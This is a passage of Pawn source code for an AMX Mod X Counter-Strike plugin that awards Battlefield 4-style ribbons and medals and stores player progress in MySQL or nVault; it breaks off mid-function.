//
	// OciXCrom's Rank System Addon
	// BF4 Rank System.

	// Default Settings:
	// O Enemy Killed			- Kill an enemy (100)
	// O Headshot Bonus			- Kill an enemy with a shot to the head (25)

	// X Multi-Kill				- Kill two or more enemies in a few seconds (20)
	// O Marksman Bonus 		- Kill an enemy by shooting their head with a Sniper Rifle over a long distance (25)
	// O Kill Assist 			- Damage an enemy and allow a teammate to kill them. Score earned depends on the damage inflicted (1-75)
	// O Assist Counts as Kill 	- Greatly damage an enemy and allow a teammate to kill them. Your assist will count as a kill (76-99)
	// X Comeback Bonus 		- Kill an enemy after a four death streak. Each death after four will add another 10 to the score (40+)
	// X Killstreak Stopped 	- Kill an enemy after they reach a four killstreak. Each kill after four will add another 10 to the score (40+)
	// O Avenger Bonus 			- Kill an enemy who recently killed your teammate (25)
	// O Savior Bonus 			- Kill an enemy who is currently injuring or suppressing your teammate (25)
	// X Squad Wiped 			- Kill the last surviving member of an enemy squad (50)
	// X Payback 				- Kill the same enemy who previously killed you (50)
	// X Suppression Assist 	- Suppress an enemy and allow a teammate to kill them (10)
	// X Spot Bonus 			- Spot an enemy and have a teammate kill them (25)
//
//=====================================
//  INCLUDE AREA
//=====================================
#pragma compress	1
#pragma tabsize		4
#include <amxmodx>
#include <amxmisc>
#include <cstrike>
#include <fun>
#include <fakemeta>
#include <hamsandwich>
#include <xs>
#include <crxranks>
#include <sqlx>
#include <nvault>
#include <reapi>
#include <bf4natives>

#define UnitsToMeters(%1)	(%1*0.0254)
#define BF4_VAULT			"BF4Ranks"
#define	MAX_LENGTH			128
#define MAX_ERR_LENGTH		512
#define MAX_QUERY_LENGTH	2048
#define PLUGIN 				"BF4 Rank System (CRX Addon)"
#define VERSION 			"0.01"
#define AUTHER				"Aoi.Kagase"
enum _:E_BF4_RANK_CVARS
{
	E_CV_REWARD
};

enum _:E_BF4_TYPE
{
	TYPE_RIBBON			= 0,
	TYPE_MEDAL,
	TYPE_MAX
};

enum _:E_BF4_RANK
{
	BF4_RNK_MARKSMAN 	= 0,
	BF4_RNK_HEADSHOT,
	BF4_RNK_PISTOL	,
	BF4_RNK_ASSAULT ,
	// BF4_RNK_CARBIN	, // M4A1 only...
	BF4_RNK_SNIPER	,
	BF4_RNK_LMG		,
	BF4_RNK_DMR		,
	// BF4_RNK_PDW 	, // P90 only...
	BF4_RNK_SMG		, // PDW Alternative
	BF4_RNK_SHOTGUN	,
	BF4_RNK_MELEE	,
	BF4_RNK_ASSIST	,
	BF4_RNK_AVENGER	,
	BF4_RNK_SAVIOR	,
	BF4_RNK_MVP		,
	BF4_RNK_MEDIKIT	,
	BF4_RNK_AMMOBOX	,
	BF4_RNK_REVIVE	, 
	BF4_RNK_CTF_CAP	,
	BF4_RNK_CTF_WIN	,
	BF4_RNK_MAX
};

enum _:E_RANK_PARAM
{
	RBN_TYPE,
	RBN_ID,
	RBN_NAME	[32],
	RBN_FILENAME[32],
	RBN_KILL,
	RBN_SCORE,
};

enum _:BF4_MSGID
{
	MSGID_WEAPON_LIST,
	MSGID_SET_FOV,
	MSGID_CUR_WEAPON,
	MSGID_HIDE_WEAPON,	
};

enum _:E_BF4_OBJECT_MENU
{
	E_HEALTH_KIT	= 0,
	E_AMMO_BOX,
	E_REVIVAL_KIT,
};

enum _:E_SAVIOR
{
	Float:SV_TIME,
	SV_TARGET,
};

enum _:E_AMMO_IDS
{
	ammo_none,
	ammo_338magnum = 1,
	ammo_762nato,
	ammo_556natobox,
	ammo_556nato,
	ammo_buckshot,
	ammo_45acp,
	ammo_57mm,
	ammo_50ae,
	ammo_357sig,
	ammo_9mm
};
#pragma semicolon	1

#define ITEM_OWNER pev_iuser1
#define ITEM_TEAM  pev_iuser2

new const ENT_MODELS[E_BF4_OBJECT_MENU][] =
{
	"models/bf4_ranks/medkit.mdl",
	"models/bf4_ranks/ammobox.mdl",
	"",
};

new const ENT_CLASS[E_BF4_OBJECT_MENU][]=
{
	"bf4_healthkit",
	"bf4_ammobox",
	"",
};

new const TASK_AWARD		= 1122300;
new const TASK_HUD_SPR     	= 1122400;
new const TASK_ROUND_READY	= 1122600;

// AMMOID, MAXBPAMMO
new const CSW_AMMO_ID[CSW_P90 + 1][2] =
{
	{ -1, -1},			// CSW_NONE
	{  9, 52},			// CSW_P228
	{ -1, -1},			// CSW_GLOCK Unused by game, See CSW_GLOCK18.
	{  2, 90},			// CSW_SCOUT
	{ 12,  1},			// CSW_HEGRENADE
	{  5, 32},			// CSW_XM1014
	{ 14,  1},			// CSW_C4
	{  6,100},			// CSW_MAC10
	{  4, 90},			// CSW_AUG
	{ 13,  1},			// CSW_SMOKEGRENADE
	{ 10,120},			// CSW_ELITE
	{  7,100}, 			// CSW_FIVESEVEN
	{  6,100}, 			// CSW_UMP45
	{  4, 90}, 			// CSW_SG550
	{  4, 90}, 			// CSW_GALIL
	{  4, 90}, 			// CSW_FAMAS
	{  6,100}, 			// CSW_USP
	{ 10,120}, 			// CSW_GLOCK18
	{  1, 30}, 			// CSW_AWP
	{ 10,120}, 			// CSW_MP5NAVY
	{  3,200}, 			// CSW_M249
	{  5, 32}, 			// CSW_M3
	{  4, 90}, 			// CSW_M4A1
	{ 10,120}, 			// CSW_TMP
	{  2, 90}, 			// CSW_G3SG1
	{ 11,  2}, 			// CSW_FLASHBANG
	{  8, 35}, 			// CSW_DEAGLE
	{  4, 90}, 			// CSW_SG552
	{  2, 90}, 			// CSW_AK47
	{ -1, -1}, 			// CSW_KNIFE
	{  7,100} 			// CSW_P90
};


new const g_szAmmoNames[E_AMMO_IDS][] = {
	"",
	"338magnum",
	"762nato",
	"556natobox",
	"556nato",
	"buckshot",
	"45acp",
	"57mm",
	"50ae",
	"357sig",
	"9mm"
};

new const g_points[E_BF4_RANK] =
{
	25,	// MARKSMAN
	25,	// HEADSHOT
	0,	// HANDGUN,
	0,	// ASSAULT RIFLE
	0,	// SNIPER RIFLE
	0,	// LMG
	0,	// DMR
	0,	// SMG
	0,	// SHOTGUN
	0,	// MELEE
	0,	// KILL ASSIST (0 - 100)
	25,	// AVENGER
	25,	// SAVIOR
	0,	// MVP
	15,	// MEDIKIT
	15,	// AMMO SUPLY
	70,	// Revive
	400,// CTF Capture
	0,	// CTF Win
	0,
};

new const g_Ribbons[E_BF4_RANK][E_RANK_PARAM] = 
{
	{TYPE_RIBBON, BF4_RNK_MARKSMAN, "MARKSMAN RIBBON", 		"rbn_marksman",	1,	200},
	{TYPE_RIBBON, BF4_RNK_HEADSHOT, "HEADSHOT RIBBON", 		"rbn_headshot",	3,	200},
	{TYPE_RIBBON, BF4_RNK_PISTOL,	"HANDGUN RIBBON", 		"rbn_handgun",	4,	200},
	{TYPE_RIBBON, BF4_RNK_ASSAULT, 	"ASSAULT RIFLE RIBBON",	"rbn_assault",	6,	200},
	// {TYPE_RIBBON, BF4_RNK_RBN_CARBIN, "CARBIN RIBBON", 		"rbn_carbin",	6,	200},
	{TYPE_RIBBON, BF4_RNK_SNIPER, 	"SNIPER RIFLE RIBBON", 	"rbn_sniper",	6,	200},
	{TYPE_RIBBON, BF4_RNK_LMG, 		"LMG RIBBON", 			"rbn_lmg",		6,	200},
	{TYPE_RIBBON, BF4_RNK_DMR,		"DMR RIBBON", 			"rbn_dmr",		6,	200},
	// {TYPE_RIBBON, BF4_RBN_PDW, 	"PDW RIBBON", 			"rbn_pdw",		6,	200},
	{TYPE_RIBBON, BF4_RNK_SMG, 		"SMG RIBBON", 			"rbn_pdw",		6,	200},
	{TYPE_RIBBON, BF4_RNK_SHOTGUN, 	"SHOTGUN RIBBON", 		"rbn_shotgun",	6,	200},
	{TYPE_RIBBON, BF4_RNK_MELEE, 	"MELEE RIBBON", 		"rbn_melee",	4,	200},
	{TYPE_RIBBON, BF4_RNK_ASSIST,	"KILL ASSIST RIBBON", 	"rbn_assist",	5,	200},
	{TYPE_RIBBON, BF4_RNK_AVENGER,	"AVENGER RIBBON", 		"rbn_avenger",	2,	200},
	{TYPE_RIBBON, BF4_RNK_SAVIOR,	"SAVIOR RIBBON", 		"rbn_savior",	2,	200},
	{TYPE_RIBBON, BF4_RNK_MVP,		"MVP RIBBON", 			"rbn_mvp",		1,	200},
	{TYPE_RIBBON, BF4_RNK_MEDIKIT,	"MEDIKIT RIBBON",		"rbn_medikit",	8,	200},
	{TYPE_RIBBON, BF4_RNK_AMMOBOX,	"AMMO RIBBON",			"rbn_ammo",		8,	200},
	{TYPE_RIBBON, BF4_RNK_REVIVE,	"DEFIBRILLATOR RIBBON",	"rbn_revive",	5,	200},
	{TYPE_RIBBON, BF4_RNK_CTF_CAP,	"FLAG CAPTURE RIBBON",	"rbn_ctf1",		2,	200},
	{TYPE_RIBBON, BF4_RNK_CTF_WIN,	"CTF RIBBON",			"rbn_ctf2",		1,	1500},
	{}//MAX
};

new const g_Medals[E_BF4_RANK][E_RANK_PARAM] =
{
	{TYPE_MEDAL, BF4_RNK_MARKSMAN, 	"MARKSMAN MEDAL", 		"mdl_marksman",	50,	5000},
	{TYPE_MEDAL, BF4_RNK_HEADSHOT, 	"HEADSHOT MEDAL", 		"mdl_headshot",	50,	5000},
	{TYPE_MEDAL, BF4_RNK_PISTOL,	"HANDGUN MEDAL", 		"mdl_handgun",	50,	5000},
	{TYPE_MEDAL, BF4_RNK_ASSAULT, 	"ASSAULT RIFLE MEDAL",	"mdl_assault",	50,	5000},
	// {BF4_RNK_CARBIN, "CARBIN MEDAL", 		"mdl_carbin",	50,	0},
	{TYPE_MEDAL, BF4_RNK_SNIPER, 	"SNIPER RIFLE MEDAL", 	"mdl_sniper",	50,	5000},
	{TYPE_MEDAL, BF4_RNK_LMG, 		"LMG MEDAL", 			"mdl_lmg",		50,	5000},
	{TYPE_MEDAL, BF4_RNK_DMR,		"DMR MEDAL", 			"mdl_dmr",		50,	5000},
	// {BF4_RNK_PDW, 	"PDW MEDAL", 			"mdl_pdw",		50,	0},
	{TYPE_MEDAL, BF4_RNK_SMG, 		"SMG MEDAL", 			"mdl_pdw",		50,	5000},
	{TYPE_MEDAL, BF4_RNK_SHOTGUN, 	"SHOTGUN MEDAL", 		"mdl_shotgun",	50,	5000},
	{TYPE_MEDAL, BF4_RNK_MELEE, 	"MELEE MEDAL", 			"mdl_melee",	50,	5000},
	{TYPE_MEDAL, BF4_RNK_ASSIST,	"KILL ASSIST MEDAL", 	"mdl_assist",	50,	5000},
	{TYPE_MEDAL, BF4_RNK_AVENGER,	"AVENGER MEDAL", 		"mdl_avenger",	50,	5000},
	{TYPE_MEDAL, BF4_RNK_SAVIOR,	"SAVIOR MEDAL", 		"mdl_savior",	50,	5000},
	{TYPE_MEDAL, BF4_RNK_MVP,		"MVP MEDAL", 			"mdl_mvp",		50,	5000},
	{TYPE_MEDAL, BF4_RNK_MEDIKIT,	"MEDIKIT MEDAL",		"mdl_medikit",	50,	5000},
	{TYPE_MEDAL, BF4_RNK_AMMOBOX,	"AMMO MEDAL",			"mdl_ammo",		50,	5000},
	{TYPE_MEDAL, BF4_RNK_REVIVE,	"DEFIBRILLATOR MEDAL",	"mdl_revive",	50,	5000},
	{TYPE_MEDAL, BF4_RNK_CTF_CAP,	"FLAG CAPTURE MEDAL",	"mdl_ctf1",		50,	5000},
	{TYPE_MEDAL, BF4_RNK_CTF_WIN,	"CTF MEDAL",			"mdl_ctf2",		50,	5000},
	{} //MAX
};

const CSW_BF4_WEAPONS		=(~(1<<CSW_VEST));
const CSW_BF4_PISTOLS		=( 1<<CSW_P228
							|  1<<CSW_ELITE
							|  1<<CSW_FIVESEVEN
							|  1<<CSW_USP
							|  1<<CSW_GLOCK18
							|  1<<CSW_DEAGLE);
const CSW_BF4_SHOTGUNS		=( 1<<CSW_M3
							|  1<<CSW_XM1014);
const CSW_BF4_SMGS			=( 1<<CSW_MAC10
							|  1<<CSW_UMP45
							|  1<<CSW_MP5NAVY
							|  1<<CSW_TMP
							|  1<<CSW_P90);
const CSW_BF4_ASSAULTS		=( 1<<CSW_M4A1
							|  1<<CSW_AUG
							|  1<<CSW_GALIL
							|  1<<CSW_FAMAS
							|  1<<CSW_AK47
							|  1<<CSW_SG552);
const CSW_BF4_SNIPERS		=( 1<<CSW_SCOUT
							|  1<<CSW_AWP);
const CSW_BF4_DMRS			=( 1<<CSW_G3SG1
							|  1<<CSW_SG550);
const CSW_BF4_LMGS			=( 1<<CSW_M249);
const CSW_BF4_GRENADES		=( 1<<CSW_HEGRENADE	
							|  1<<CSW_SMOKEGRENADE
							|  1<<CSW_FLASHBANG);
const CSW_BF4_ARMORS		=( 1<<CSW_VEST
							|  1<<CSW_VESTHELM);
const CSW_BF4_GUNS			=( CSW_BF4_PISTOLS
							|  CSW_BF4_SHOTGUNS
							|  CSW_BF4_SMGS
							|  CSW_BF4_ASSAULTS
							|  CSW_BF4_SNIPERS
							|  CSW_BF4_DMRS
							|  CSW_BF4_LMGS);

new g_get_ribbon_id			[MAX_PLAYERS + 1][E_RANK_PARAM];
new g_cvars					[E_BF4_RANK_CVARS];
new Float:g_assist			[MAX_PLAYERS + 1][MAX_PLAYERS + 1];	//damage[Attacker][Victim]
new g_savior				[MAX_PLAYERS + 1][E_SAVIOR];
new g_avenger				[MAX_PLAYERS + 1];
new g_iMaxPlayers;

new g_MsgIds				[BF4_MSGID];
new g_get_ribbon			[MAX_PLAYERS + 1];

new g_ribbon_score_count	[MAX_PLAYERS + 1][E_BF4_RANK];
new g_medals_score_count	[MAX_PLAYERS + 1][E_BF4_RANK];
new g_sound					[][] = 
{
	"bf4_ranks/GetAwardWave.wav",
	"bf4_ranks/GetMedalWave.wav"
};
new g_sync_obj;

new Array:g_QueScoreEffect	[MAX_PLAYERS + 1];
new g_authids				[MAX_PLAYERS + 1][MAX_AUTHID_LENGTH];

enum BF4_WEAPONCLASS
{
	BF4_WEAPONCLASS_NONE,
	BF4_WEAPONCLASS_PISTOLS,
	BF4_WEAPONCLASS_ASSAULTS,
//	BF4_WEAPONCLASS_CARBINS,
	BF4_WEAPONCLASS_SNIPERS,
//	BF4_WEAPONCLASS_PDWS,
	BF4_WEAPONCLASS_LMGS,	
	BF4_WEAPONCLASS_DMRS,
	BF4_WEAPONCLASS_SMGS,
	BF4_WEAPONCLASS_SHOTGUNS,
	BF4_WEAPONCLASS_MELEE,
	BF4_WEAPONCLASS_GRENADE,
};


//Database Handles
new Handle:g_dbTaple;
new Handle:g_dbConnect;
new const  g_TblName	[MAX_LENGTH] = "BF4Ranks";
new g_dbError			[MAX_ERR_LENGTH];
new g_ChatPrefix		[MAX_NAME_LENGTH];
new g_isUseDb;
new g_ready_players;
enum DB_CONFIG
{
	DB_HOST[MAX_LENGTH] = 0,
	DB_USER[MAX_LENGTH],
	DB_PASS[MAX_LENGTH],
	DB_NAME[MAX_LENGTH],
}
//Database setting
new g_dbConfig[DB_CONFIG];
new g_nv_handle;
new bool:g_roundready;
new gEntItem;
new const ENT_CLASS_BREAKABLE[] = "func_breakable";
new gSubMenuCallback;
new gObjectItem[MAX_PLAYERS + 1];

//LoadPlugin
public plugin_core()
{
	new isUseMysql[2];
	crxranks_get_setting("USE_MYSQL", isUseMysql, charsmax(isUseMysql));
	if ((g_isUseDb = crxranks_is_using_mysql()))
	{
		new error[MAX_ERR_LENGTH + 1];
		new ercode;

		crxranks_get_setting("SQL_HOST", 		g_dbConfig[DB_HOST], charsmax(g_dbConfig[DB_HOST]));
		crxranks_get_setting("SQL_USER", 		g_dbConfig[DB_USER], charsmax(g_dbConfig[DB_USER]));
		crxranks_get_setting("SQL_PASSWORD", 	g_dbConfig[DB_PASS], charsmax(g_dbConfig[DB_PASS]));
		crxranks_get_setting("SQL_DATABASE", 	g_dbConfig[DB_NAME], charsmax(g_dbConfig[DB_NAME]));
		crxranks_get_chat_prefix(g_ChatPrefix, 	charsmax(g_ChatPrefix));

		g_dbTaple 	= SQL_MakeDbTuple(
			g_dbConfig[DB_HOST],
			g_dbConfig[DB_USER],
			g_dbConfig[DB_PASS],
			g_dbConfig[DB_NAME]
		);
		g_dbConnect = SQL_Connect(g_dbTaple, ercode, error, charsmax(error));
		if (g_dbConnect == Empty_Handle)
			server_print("[BF4Ranks Addon]  Error No.%d: %s", ercode, error);
		else 
		{
			server_print("[BF4Ranks Addon] Connecting successful.");
			init_database();
		}
	}
	else
	{
		g_nv_handle = nvault_open(BF4_VAULT);
	}
	return PLUGIN_CONTINUE;
}
//Create Table
init_database()
{
	new sql[MAX_QUERY_LENGTH + 1];
	new Handle:queries[10];
	new len = 0, i = 0;

	// CREATE TABLE server_map.		Map infomation.
	//
	len = 0;
	sql = "";
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, "  CREATE TABLE IF NOT EXISTS `%s`.`%s`", g_dbConfig[DB_NAME], g_TblName);
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, " (`authid` 			CHAR(50) 		NOT NULL,");	// Auth ID.
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, "  `type` 			CHAR(01) 		NOT NULL,");	// Ribbon or Medal.
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, "  `rank_id` 			CHAR(2) 		NOT NULL,");	// Ribbon or Medal ID.
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, "  `value` 			BIGINT(20) 		NOT NULL DEFAULT 0,");
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, "  `created_at` 		TIMESTAMP       NOT NULL DEFAULT CURRENT_TIMESTAMP(),");
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, "  `updated_at` 		TIMESTAMP       NOT NULL DEFAULT CURRENT_TIMESTAMP() ON UPDATE CURRENT_TIMESTAMP(),");
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, "   PRIMARY KEY (`authid`,`type`,`rank_id`) USING BTREE");
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, " );");
	queries[i++] = SQL_PrepareQuery(g_dbConnect, sql);
	execute_insert_multi_query(queries ,i);

	return PLUGIN_CONTINUE;
}

execute_insert_multi_query(Handle:query[], count)
{
	if (!g_dbConnect)
		return 0;

	for(new i = 0; i < count;i++)
	{
		if(!SQL_Execute(query[i]))
		{
			// if there were any problems
			SQL_QueryError(query[i], g_dbError, charsmax(g_dbError));
		}
		SQL_FreeHandle(query[i]);
	}
	return 1;
}

public plugin_precache()
{
	check_plugin();

	for(new i = 0; i <= _:E_AMMO_BOX; i++)
		precache_model(ENT_MODELS[i]);

	for(new i = 0; i < TYPE_MAX; i++)
	{
		for(new n = 0; n < BF4_RNK_MAX; n++)
		{
			if (i == TYPE_RIBBON)
			{
				precache_generic(fmt("sprites/bf4_ranks/ribbons/%s.txt", g_Ribbons[n][RBN_FILENAME]));
				precache_generic(fmt("sprites/bf4_ranks/ribbons/%s.spr", g_Ribbons[n][RBN_FILENAME]));
			}
			else
			{
				precache_generic(fmt("sprites/bf4_ranks/medals/%s.txt", g_Medals[n][RBN_FILENAME]));
				precache_generic(fmt("sprites/bf4_ranks/medals/%s.spr", g_Medals[n][RBN_FILENAME]));
			}
		}
		precache_sound(g_sound[i]);
	}
	precache_sound("items/gunpickup2.wav");
	precache_sound("items/ammopickup2.wav");
	precache_sound("items/medshot4.wav");
}

public plugin_init()
{
	register_plugin		("BF4 Rank System (CRX Addon)", "0.01", "Aoi.Kagase", "github.com/AoiKagase", "BF4 Ribbon");
	create_cvar			("BF4 Rank System", VERSION, FCVAR_SERVER|FCVAR_SPONLY);
	bind_pcvar_num		(create_cvar("bf4_spawn_reward", "1600"), g_cvars[E_CV_REWARD]);
	register_clcmd		("say /bf4", "BF4ObjectMenu");
	register_clcmd		("bf4menu", "BF4ObjectMenu");

	RegisterHamPlayer	(Ham_TakeDamage,	"BF4TakeDamage", 		0);
	RegisterHamPlayer	(Ham_Spawn, 		"BF4PlayerSpawnPost", 	1);  
 	// RegisterHamPlayer(Ham_Think,		"SpriteMove", 			1);

	register_event_ex	("CurWeapon", 		"Event_CurWeapon", 		RegisterEvent_Single | RegisterEvent_OnlyAlive, "1=1");
	register_event_ex	("DeathMsg",  		"BF4DeathMsg", 			RegisterEvent_Global);
    register_event_ex	("TeamInfo", 		"BF4JoinTeam", 			RegisterEvent_Global);   

	RegisterHam(Ham_Think, ENT_CLASS_BREAKABLE, "BF4ObjectThink");

	g_MsgIds[MSGID_WEAPON_LIST] = get_user_msgid("WeaponList");
	g_MsgIds[MSGID_SET_FOV] 	= get_user_msgid("SetFOV");
	g_MsgIds[MSGID_CUR_WEAPON] 	= get_user_msgid("CurWeapon");
	g_MsgIds[MSGID_HIDE_WEAPON] = get_user_msgid("HideWeapon");

	g_iMaxPlayers 	 = get_maxplayers();
	for (new i = 1; i <= g_iMaxPlayers; i++)
		g_QueScoreEffect[i] = ArrayCreate(E_RANK_PARAM);

	g_sync_obj = CreateHudSyncObj();	

	set_task_ex(0.2, "plugin_core");
	set_task_ex(1.0, "CheckRoundStart", TASK_ROUND_READY, _, _, SetTask_Repeat);
	
	new minpl[3];
	crxranks_get_setting("MINIMUM_PLAYERS", minpl, charsmax(minpl));
	g_ready_players = str_to_num(minpl);
	// registered func_breakable
	gEntItem = engfunc(EngFunc_AllocString, ENT_CLASS_BREAKABLE);

	gSubMenuCallback = menu_makecallback("bf4_object_menu_callback");
	RegisterHookChain( RG_RoundEnd, "RoundEnd", 0 );
}

public plugin_natives()
{
	register_library("bf4_ranksystem_natives");
	register_native("BF4CtfCapture", "_native_bf4_ctf_capture");
	register_native("BF4CtfWin", "_native_bf4_ctf_win");
	register_native("BF4ReviveBonus", "_native_bf4_revive");
}

public _native_bf4_ctf_capture(iPlugin, iParams)
{
	new id = get_param(1);
	StockBF4CtfCapture(id);	
}

public _native_bf4_revive(iPlugin, iParams)
{
	new id = get_param(1);
	
	BF4TriggerGetRibbon(id, BF4_RNK_CTF_WIN, "Defibrillator Point.");
}

StockBF4CtfCapture(id)
{
	BF4TriggerGetRibbon(id, BF4_RNK_CTF_WIN, "Flag Capture points.");
}

public _native_bf4_ctf_win(iPlugin, iParams)
{
	new team = get_param(1);
	StockBF4CtfWin(team);
}

StockBF4CtfWin(team)
{
	new iPlayers[MAX_PLAYERS];
	new pnum;
	switch(team)
	{
		case CS_TEAM_T:	get_players_ex(iPlayers, pnum, GetPlayers_ExcludeHLTV | GetPlayers_MatchTeam, "Terrorist");
		case CS_TEAM_CT:get_players_ex(iPlayers, pnum, GetPlayers_ExcludeHLTV | GetPlayers_MatchTeam, "CT");
	}

	for(new i = 0; i < pnum; i++)
	{
		BF4TriggerGetRibbon(iPlayers[i], BF4_RNK_CTF_WIN);
	}
}

public csf_flag_taken(id)
{
	if (get_playersnum() < g_ready_players)
		return PLUGIN_CONTINUE;

	BF4CtfCapture(id);
	return PLUGIN_CONTINUE;
}

public csf_round_won(team)
{
	if (get_playersnum() < g_ready_players)
		return PLUGIN_CONTINUE;

	BF4CtfWin(team);
	return PLUGIN_CONTINUE;
}

public csf_match_won(team)
{
	if (get_playersnum() < g_ready_players)
		return PLUGIN_CONTINUE;

	BF4CtfWin(team);
	return PLUGIN_CONTINUE;
}

public RoundEnd( WinStatus:status, ScenarioEventEndRound:event, Float:tmDelay )
{
    if ( event == ROUND_GAME_COMMENCE)
    {
		if (!g_roundready)
		{
    	    set_member_game( m_bGameStarted, false );
	        SetHookChainReturn( ATYPE_BOOL, false );
	        return(HC_SUPERCEDE);
		}
		else
		{
	   	    set_member_game( m_bGameStarted, true );
	        SetHookChainReturn( ATYPE_BOOL, true );
		}
    }

	if (!g_roundready)
	{
	    set_member_game( m_bGameStarted, false );
        SetHookChainReturn( ATYPE_BOOL, false );
        return(HC_SUPERCEDE);
	}
    return(HC_CONTINUE);
}

public CheckRoundStart()
{
	new players[MAX_PLAYERS], pnum;
	get_players_ex(players, pnum, GetPlayers_ExcludeBots | GetPlayers_ExcludeHLTV);
	if (get_playersnum() < g_ready_players && g_ready_players > 0)
	{
		g_roundready = false;
		set_hudmessage(255, 255, 255, -1.00, -0.74, .effects=0, .fxtime=0.01, .holdtime=1.0, .fadeintime=0.01, .fadeouttime=0.2, .channel=1);
		for (new i = 0; i < pnum; i++)
		ShowSyncHudMsg(players[i], g_sync_obj, 
			"+---  WAITING FOR PLAYERS  ---+^n|         PLAYERS NEEDED:         |^n+---   %2d/%2d PLAYERS READY   ---+", get_playersnum(), g_ready_players);
	}
	else
	{
		if (!g_roundready)
		g_roundready = true;
	}
}

public plugin_end()
{
	for (new i = 1; i <= g_iMaxPlayers; i++)
		ArrayDestroy(g_QueScoreEffect[i]);

	if (g_isUseDb)
	{
		SQL_FreeHandle(g_dbConnect);
		SQL_FreeHandle(g_dbTaple);
	}
	else
	{
		nvault_close(g_nv_handle);
	}
}

public client_authorized(id)
{
	for (new n = 0; n < BF4_RNK_MAX; n++)
	{
		g_ribbon_score_count[id][n] = 0; // KILL COUNT
		g_medals_score_count[id][n] = 0; // KILL COUNT
	}

	for(new i = 1; i <= g_iMaxPlayers; i++)
		g_assist[id][i] 	 = 0.0;

	g_savior [id][SV_TIME] 	 = 0.0,
	g_savior [id][SV_TARGET] = 0,
	g_avenger[id]    		 = 0;

	g_get_ribbon[id] = false;
	get_user_authid(id, g_authids[id], charsmax(g_authids[]));

	set_task_ex(1.0, "AwardCheck", id + TASK_AWARD, _, _, SetTask_Repeat);

	if (g_isUseDb)
		initialize_user_data_sql(id);
	else
		initialize_user_data_nvault(id);

	if (get_playersnum() >= g_ready_players)
		g_roundready = true;		
}

public client_disconnected(id)
{
	if (task_exists(id + TASK_AWARD))
		remove_task(id + TASK_AWARD);
	
	if (task_exists(id + TASK_HUD_SPR))
		remove_task(id + TASK_HUD_SPR);

	if (is_user_bot(id))
		return PLUGIN_CONTINUE;

	new sql[512];

	for (new i = 0; i < TYPE_MAX; i++)
	{
		for (new n = 0; n < BF4_RNK_MAX; n++)
		{
			if (g_isUseDb)
			{
				formatex(sql, charsmax(sql), "REPLACE INTO `%s`.`%s` (`authid`, `type`, `rank_id`, `value`) VALUES ('%s', '%d', '%d', '%d');", g_dbConfig[DB_NAME], g_TblName, g_authids[id], i, n, (i ? g_medals_score_count[id][n] : g_ribbon_score_count[id][n]));
				execute_insert_sql(sql);
			}
			else
			{
				nvault_set(g_nv_handle, fmt("%s_%d_%d", g_authids[id], i, n), fmt("%d", (i ? g_medals_score_count[id][n] : g_ribbon_score_count[id][n])));
			}
		}
	}
	return PLUGIN_CONTINUE;
}

stock initialize_user_data_sql(id)
{
	if (!g_dbConnect)
		return;

	new sql[512];
	formatex(sql, charsmax(sql), "SELECT `authid`, `type`, `rank_id`, `value` FROM `%s`.`%s` WHERE `authid` = '%s'", g_dbConfig[DB_NAME], g_TblName, g_authids[id]);
	new Handle:query = SQL_PrepareQuery(g_dbConnect, sql);
	
	// run the query
	if(!SQL_Execute(query))
	{
		// if there were any problems
		SQL_QueryError(query,g_dbError, charsmax(g_dbError));
	}

	while(SQL_MoreResults(query))
	{
		switch(SQL_ReadResult(query, 1))
		{
			case TYPE_RIBBON:
				g_ribbon_score_count[id][SQL_ReadResult(query, 2)] = SQL_ReadResult(query, 3);
			case TYPE_MEDAL:
				g_medals_score_count[id][SQL_ReadResult(query, 2)] = SQL_ReadResult(query, 3);
		}
		SQL_NextRow(query);
	}
	// of course, free the handle
	SQL_FreeHandle(query);
}

stock initialize_user_data_nvault(id)
{
	new temp[7], timestamp;

	for(new i = 0; i < TYPE_MAX; i++)
	{
		for(new n = 0; n < BF4_RNK_MAX; n++)
		{
			if (nvault_lookup(g_nv_handle, fmt("%s_%d_%d",g_authids[id], i, n), temp, charsmax(temp), timestamp))
			{
				if (i)
					g_medals_score_count[id][n] = str_to_num(temp);
				else
					g_ribbon_score_count[id][n] = str_to_num(temp);
			}
		}
	}
}

stock execute_insert_sql(sql[])
{
	if (!g_dbConnect)
		return;

	new Handle:result[1];
	result[0] = SQL_PrepareQuery(g_dbConnect, sql);
	execute_insert_multi_query(result, 1);
}

public AwardCheck(task)
{
	new id = task - TASK_AWARD;
	if (!is_user_connected(id))
	{
		remove_task(task);
		return PLUGIN_CONTINUE;
	}

	if (get_playersnum() < g_ready_players)
		return PLUGIN_CONTINUE;

	if (ArraySize(g_QueScoreEffect[id]) > 0 && !g_get_ribbon[id])
	{
		new ribbon[E_RANK_PARAM];
		ArrayGetArray(g_QueScoreEffect[id], 0, ribbon, sizeof(ribbon));

		new score[4];
		num_to_str(ribbon[RBN_SCORE], score, charsmax(score));

		g_get_ribbon[id]    = true;
		g_get_ribbon_id[id] = ribbon;

		emit_sound(id, CHAN_ITEM, g_sound[ribbon[RBN_TYPE]], 1.0, ATTN_NORM, 0, PITCH_NORM);
		if (ribbon[RBN_TYPE] == TYPE_RIBBON)
			set_hudmessage(255, 255, 255, -1.00, -0.68, .effects=2, .fxtime=0.01, .holdtime=2.5, .fadeintime=0.01, .fadeouttime=0.2, .channel=1);
		else
			set_hudmessage(255, 255, 255, -1.00, -0.74, .effects=2, .fxtime=0.01, .holdtime=2.5, .fadeintime=0.01, .fadeouttime=0.2, .channel=1);

		show_hudmessage(id, ribbon[RBN_NAME]);
		Show_Rank_Event(id, ribbon);

		if (ribbon[RBN_SCORE] > 0)
		{
			set_hudmessage(255, 255, 255, -1.00, -0.54, .effects=2, .fxtime=0.01, .holdtime=2.5, .fadeintime=0.01, .fadeouttime=0.2, .channel=2);
			show_hudmessage(id, score);
			crxranks_give_user_xp(id, ribbon[RBN_SCORE]);
		}
		set_task_ex(3.2, "Clear_Rank_Event", id + TASK_HUD_SPR);
		ArrayDeleteItem(g_QueScoreEffect[id], 0);
	}
	return PLUGIN_CONTINUE;
}

stock BF4TriggerGetRibbon(id, ribbon, info[] = "")
{
	if (!is_user_connected(id))
		return PLUGIN_CONTINUE;

	if (is_user_bot(id))
